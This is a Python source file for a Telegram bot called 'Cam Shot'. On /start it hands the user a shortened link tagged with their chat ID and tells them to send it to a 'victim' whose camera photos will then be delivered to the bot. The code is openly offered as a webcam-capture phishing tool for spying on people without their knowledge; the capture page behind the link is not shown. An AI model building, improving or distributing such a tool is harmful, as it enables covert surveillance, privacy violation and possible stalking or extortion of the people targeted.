import os
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv

nest_asyncio.apply()
load_dotenv()

BOT_TOKEN = os.environ.get("BOT_TOKEN")
APP_LINK = 'https://tinyurl.com/2eccscdh'

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    link = f"{APP_LINK}?id={chat_id}"
    msg = (f'''
📸 <b>Cam Shot</b>

🔗 <b>Link: {link}</b>

👨‍💻 <b>Send above link to victim and get his pics</b>

⚠️ <b>Pics of victim will recive in this bot, above link is permanent.</b>
''')
    
    await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode="HTML")

async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("🤖 Bot is running...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
